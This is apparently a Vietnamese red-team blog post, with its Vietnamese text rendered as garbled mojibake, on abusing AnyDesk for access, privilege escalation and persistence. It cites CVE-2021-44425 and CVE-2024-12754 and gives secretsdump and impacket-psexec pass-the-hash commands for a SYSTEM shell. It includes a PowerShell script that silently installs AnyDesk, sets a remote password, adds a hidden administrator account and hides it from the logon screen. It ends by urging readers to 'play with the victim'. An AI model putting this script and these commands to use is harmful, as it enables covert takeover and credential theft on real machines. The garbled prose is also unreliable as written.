---
title: "Repurposing remote desktop application as a strategic exploit"
published: 2025-02-10
description: ""
image: ""
tags:
  - "VulnResearch"
  - "WindowsInternal"
category: "Cybersecurity"
draft: false 
lang: "en"
---
![alt text](new-1.png)
Trong tháº¿ giá»›i an ninh máº¡ng, cÃ´ng cá»¥ há»£p phÃ¡p Ä‘Ã´i khi trá»Ÿ thÃ nh vÅ© khÃ­ nguy hiá»ƒm khi rÆ¡i vÃ o tay káº» táº¥n cÃ´ng. CÃ¡c á»©ng dá»¥ng Remote Desktop nhÆ° AnyDesk, TeamViewer, Windows RDP khÃ´ng chá»‰ há»— trá»£ quáº£n trá»‹ há»‡ thá»‘ng tá»« xa mÃ  cÃ²n má»Ÿ ra cÆ¡ há»™i cho Red Team thá»±c hiá»‡n **Lateral Movement**, Leo thang Ä‘áº·c quyá»n (**Privilege Escalation**), vÃ  Duy trÃ¬ truy cáº­p (**Persistence**).

Trong bÃ i viáº¿t nÃ y, chÃºng ta sáº½ Ä‘i tÃ¬m hiá»ƒu má»™t chuá»—i ká»‹ch báº£n táº¥n cÃ´ng sá»­ dá»¥ng AnyDesk â€“ tá»« xÃ¢m nháº­p ban Ä‘áº§u Ä‘áº¿n thiáº¿t láº­p duy trÃ¬ káº¿t ná»‘i lÃ¢u dÃ i.

## **Initial Access**  
![alt text](image-3.png)
**1. Social Engineering**  
CÃ¡c nhÃ³m ransomware nhÆ° **Black Basta,Lockbit,...** thÆ°á»ng gá»­i hÃ ng loáº¡t email Ä‘Äƒng kÃ½ newsletter há»£p phÃ¡p, gÃ¢y nhiá»…u loáº¡n há»‡ thá»‘ng, sau Ä‘Ã³ liÃªn há»‡ qua Ä‘iá»‡n thoáº¡i (vá» lÃ  bá»™ pháº­n IT) Ä‘á»ƒ dá»¥ náº¡n nhÃ¢n táº£i AnyDesk Ä‘á»ƒ "kháº¯c phá»¥c sá»± cá»‘".

**2. Phishing**  
Email/website giáº£ máº¡o dá»¥ ngÆ°á»i dÃ¹ng táº£i phiÃªn báº£n AnyDesk Ä‘á»™c háº¡i (chá»©a backdoor hoáº·c cÃ¡c phiÃªn báº£n cÅ© cÃ³ dÃ­nh lá»• há»•ng báº£o máº­t) hoáº·c nháº­p thÃ´ng tin xÃ¡c thá»±c giáº£. Khi cÃ i Ä‘áº·t thÃ nh cÃ´ng, attacker toÃ n quyá»n Ä‘iá»u khiá»ƒn mÃ¡y náº¡n nhÃ¢n qua giao diá»‡n AnyDesk.

**3. Lá»— há»•ng Pháº§n má»m** 
CÃ¡c phiÃªn báº£n AnyDesk chÆ°a vÃ¡ (Ä‘áº·c biá»‡t lá»—i **CVE-2021-44425**) cho phÃ©p attacker khai thÃ¡c Ä‘á»ƒ chiáº¿m quyá»n truy cáº­p trÃ¡i phÃ©p.  

**4. Unattended Access**
TÃ­nh nÄƒng "truy cáº­p khÃ´ng giÃ¡m sÃ¡t" cho phÃ©p káº¿t ná»‘i tá»« xa mÃ  khÃ´ng cáº§n xÃ¡c nháº­n cá»§a ngÆ°á»i dÃ¹ng. Attacker brute-force password hoáº·c dÃ¹ng credential rÃ² rá»‰ Ä‘á»ƒ duy trÃ¬ káº¿t ná»‘i ngáº§m.  
### **ğŸŒ CVE-2021-44425**  
![alt text](image.png)
Khi sá»­ dá»¥ng tÃ­nh nÄƒng tunneling, client Windows cá»§a AnyDesk má»Ÿ ra má»™t cá»•ng láº¯ng nghe khÃ´ng cáº§n thiáº¿t trÃªn mÃ¡y thuá»™c LAN cá»§a káº» táº¥n cÃ´ng. Äiá»u nÃ y cho phÃ©p káº» táº¥n cÃ´ng truy cáº­p trÃ¡i phÃ©p vÃ o bá»™ giao thá»©c tunneling cá»§a AnyDesk trÃªn mÃ¡y cá»¥c bá»™, cÅ©ng nhÆ° vÃ o báº¥t ká»³ pháº§n má»m nÃ o trÃªn mÃ¡y Ä‘Ã­ch tá»« xa Ä‘ang láº¯ng nghe qua cá»•ng Ä‘Æ°á»£c tunnel.

**Ká»‹ch báº£n Táº¥n cÃ´ng:**  
- **Bá»‘i cáº£nh:** NhÃ¢n viÃªn cÃ´ng ty dÃ¹ng AnyDesk tunnel Ä‘á»ƒ káº¿t ná»‘i mÃ¡y chá»§ ná»™i bá»™ tá»« quÃ¡n cÃ  phÃª.  
- **Lá»—i Binding TCP:** AnyDesk máº·c Ä‘á»‹nh bind tunnel qua **0.0.0.0** (táº¥t cáº£ interface), káº» táº¥n cÃ´ng cÃ¹ng máº¡ng Wi-Fi cÃ³ thá»ƒ:  
  - **Chiáº¿m quyá»n Truy cáº­p:** Khai thÃ¡c cá»•ng máº¡ng bá»‹ lá»™ Ä‘á»ƒ táº¥n cÃ´ng dá»‹ch vá»¥ ná»™i bá»™.  
  - **Leo thang Äe dá»a:** XÃ¢m nháº­p sÃ¢u vÃ o máº¡ng "an toÃ n", Ä‘Ã¡nh cáº¯p dá»¯ liá»‡u nháº¡y cáº£m qua kÃªnh tunnel.  

**Há»‡ lá»¥y:**  
- Dá»‹ch vá»¥ ná»™i bá»™ (database, file server) bá»‹ phÆ¡i bÃ y trÃªn máº¡ng cÃ´ng cá»™ng.  
- Attacker chiáº¿m quyá»n Ä‘iá»u khiá»ƒn toÃ n bá»™ stack giao tiáº¿p AnyDesk cá»§a náº¡n nhÃ¢n.  

## Privilege Escalation
á» case nÃ y chÃºng ta cÃ³ thá»ƒ táº­n dá»¥ng lá»• há»•ng **CVE-2024-12754** Ä‘á»ƒ khai thÃ¡c Local Privilege Escalation.
### **ğŸŒ CVE-2024-12754**  
CVE-2024-12754 báº¯t nguá»“n tá»« cÆ¡ cháº¿ `READ/WRITE` file tÃ¹y Ã½ cá»§a AnyDesk service, vá»‘n cháº¡y vá»›i quyá»n `NT AUTHORITY\SYSTEM`. 
![alt text](image-4.png)
Äiá»u nÃ y Ä‘á»“ng nghÄ©a vá»›i viá»‡c chÃºng ta cÃ³ thá»ƒ sao chÃ©p báº¥t ká»³ tá»‡p nÃ o Ä‘áº¿n má»™t vá»‹ trÃ­ mÃ  ngÆ°á»i dÃ¹ng cÃ³ Ä‘áº·c quyá»n tháº¥p cÃ³ thá»ƒ truy cáº­p, Ä‘á»“ng thá»i váº«n giá»¯ nguyÃªn quyá»n sá»Ÿ há»¯u vÃ  cÃ¡c thiáº¿t láº­p quyá»n háº¡n ban Ä‘áº§u.
![alt text](image-9.png)
Váº­y chÃºng ta sáº½ cÃ³ ká»‹ch báº£n táº¥n cÃ´ng nhÆ° sau:
1. **Táº­n dá»¥ng lá»— há»•ng Ä‘á»ƒ copy file SAM/SECURITY**

ChÃºng ta cÃ³ thá»ƒ káº¿t há»£p khai thÃ¡c lá»— há»•ng vÃ  phÆ°Æ¡ng phÃ¡p Shadow Copy tá»« mÃ£ nguá»“n sau: https://github.com/Wh04m1001/VSSCopy (sá»­ dá»¥ng hÃ m NtQueryDirectoryObject Ä‘á»ƒ thá»±c hiá»‡n viá»‡c copy) Ä‘á»ƒ cÃ³ thá»ƒ copy cÃ¡c file SAM/SECURITY.
![alt text](image-10.png)
> Note: **NtQueryDirectoryObject** lÃ  má»™t hÃ m trong Windows Native API (NTAPI), thuá»™c nhÃ³m hÃ m quáº£n lÃ½ Object Manager cá»§a Windows. HÃ m nÃ y cho phÃ©p truy váº¥n danh sÃ¡ch cÃ¡c Object Directory trong Windows Object Manager, giÃºp liá»‡t kÃª cÃ¡c Ä‘á»‘i tÆ°á»£ng há»‡ thá»‘ng nhÆ° named pipes, mutexes, events, symbolic links, shared memory, vÃ  device objects. 
```C
NTSTATUS NtQueryDirectoryObject(
  HANDLE DirectoryHandle, //Handle cá»§a Object Directory cáº§n truy váº¥n.
  PVOID Buffer, //Bá»™ Ä‘á»‡m chá»©a danh sÃ¡ch cÃ¡c Ä‘á»‘i tÆ°á»£ng (tráº£ vá» sau khi gá»i hÃ m).
  ULONG Length, //KÃ­ch thÆ°á»›c bá»™ Ä‘á»‡m Buffer (tÃ­nh báº±ng byte).
  BOOLEAN ReturnSingleEntry, // TRUE: Tráº£ vá» má»™t Ä‘á»‘i tÆ°á»£ng duy nháº¥t trong má»—i láº§n gá»i. FALSE: Tráº£ vá» danh sÃ¡ch Ä‘áº§y Ä‘á»§ cÃ¡c Ä‘á»‘i tÆ°á»£ng cÃ³ trong thÆ° má»¥c.
  BOOLEAN RestartScan, //TRUE: QuÃ©t láº¡i tá»« Ä‘áº§u danh sÃ¡ch Ä‘á»‘i tÆ°á»£ng. FALSE: Tiáº¿p tá»¥c quÃ©t tá»« vá»‹ trÃ­ trÆ°á»›c Ä‘Ã³.
  PULONG Context, //Con trá» Ä‘áº¿n vá»‹ trÃ­ quÃ©t hiá»‡n táº¡i (giÃ¡ trá»‹ sáº½ Ä‘Æ°á»£c cáº­p nháº­t khi quÃ©t danh sÃ¡ch Ä‘á»‘i tÆ°á»£ng).
  PULONG ReturnLength //Tráº£ vá» sá»‘ byte thá»±c táº¿ Ä‘Æ°á»£c ghi vÃ o Buffer.
);
```
ChÃºng ta xÃ¢y dá»±ng poc vÃ  output sau khi cháº¡y poc cá»§a chÃºng ta:![alt text](image-7.png)
2. **TrÃ­ch xuáº¥t Credential:**  
Sau khi chÃºng ta láº¥y Ä‘Æ°á»£c file SAM/SECURITY, chÃºng ta sá»­ dá»¥ng cÃ¡c cÃ´ng cá»¥ nhÆ° `secretsdump.py` hoáº·c `mimikatz` Ä‘á»ƒ phÃ¢n tÃ­ch:
   - NTLM Hash cá»§a tÃ i khoáº£n Administrator.
   - LSA Secrets (dá»¯ liá»‡u nháº¡y cáº£m trong registry).
   - Cached Credentials (thÃ´ng tin Ä‘Äƒng nháº­p lÆ°u cache).
      - VÃ­ dá»¥: DÃ¹ng `secretsdump` trong bá»™ `impacket` Ä‘á»ƒ trÃ­ch xuáº¥t hash.
      
      Command nhÆ° sau: `python .\.venv\Scripts\secretsdump.py -sam .\Result\sam -system .\Result\system LOCAL`

      Output:!![alt text](image-8.png)
3. **Láº¥y shell**

ChÃºng ta cÃ³ thá»ƒ sá»­ dá»¥ng ká»¹ thuáº­t Pass The Hash Ä‘á»ƒ láº¥y **system shell**.

Sá»­ dá»¥ng `psexec` tá»« bá»™ impacket Ä‘á»ƒ cháº¡y **shell** vá»›i hash Ä‘Ã£ trÃ­ch xuáº¥t Ä‘Æ°á»£c vá»›i cÃº phÃ¡p sau:
`impacket-psexec -hashes <LMHash>:<NTHash> <username>@<ip>`

**Káº¿t quáº£:**  
![alt text](image-5.png)

ChÃºng ta cÃ³ thá»ƒ cháº¡y shell vá»›i quyá»n `NT AUTHORITY\SYSTEM`. 
   ![MÃ´ táº£ áº£nh](sticker_2134-512x512.png)

## **Persistence - Backdooring AnyDesk for Future Access**  
ChÃºng ta cÅ©ng cÃ³ thá»ƒ táº­n dá»¥ng AnyDesk Ä‘á»ƒ persistence thÃ´ng qua tÃ­nh nÄƒng cho phÃ©p Ä‘áº·t máº­t kháº©u Ä‘iá»u khiá»ƒn tá»« xa.
Scripts dÆ°á»›i Ä‘Ã¢y cho phÃ©p cÃ i Ä‘áº·t AnyDesk má»™t cÃ¡ch Ã¢m tháº§m vÃ  Ä‘áº·t máº­t kháº©u Ä‘á»ƒ cÃ³ quyá»n truy cáº­p tá»« xa vÃ  Ä‘á»“ng thá»i táº¡o ra má»™t ngÆ°á»i dÃ¹ng má»›i vá»›i cÃ¡c Ä‘áº·c quyá»n quáº£n trá»‹ viÃªn vÃ  áº©n tÃ i khoáº£n má»›i khá»i mÃ n hÃ¬nh Ä‘Äƒng nháº­p Windows.
```powershell
# Táº£i & CÃ i Ä‘áº·t AnyDesk ngáº§m
mkdir "C:\ProgramData\AnyDesk"
$clnt = New-Object System.Net.WebClient
$clnt.DownloadFile("http://download.anydesk.com/AnyDesk.exe", "C:\ProgramData\AnyDesk.exe")
Start-Process "C:\ProgramData\AnyDesk.exe" -ArgumentList "--install C:\ProgramData\AnyDesk --start-with=win --silent" -Wait
# Äáº·t máº­t kháº©u Ä‘iá»u khiá»ƒn tá»« xa
Start-Process "C:\ProgramData\anydesk.exe" -ArgumentList "--set-password hacker@123" -Wait
# Táº¡o user áº©n vá»›i quyá»n Admin
net user oldadministrator "hacker#213" /add
net localgroup Administrators oldadministrator /ADD
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" /v oldadministrator /t REG_DWORD /d 0 /f
```  
Báº±ng cÃ¡ch cháº¡y Ä‘oáº¡n script trÃªn, Attacker cÃ³ thá»ƒ káº¿t ná»‘i vá»›i target qua AnyDesk báº¥t ká»³ lÃºc nÃ o. 
![alt text](image-12.png)
<h2><strong style="color: red;">Now you pwned everything!!! Itâ€™s your time to play with the victim.</strong><h2>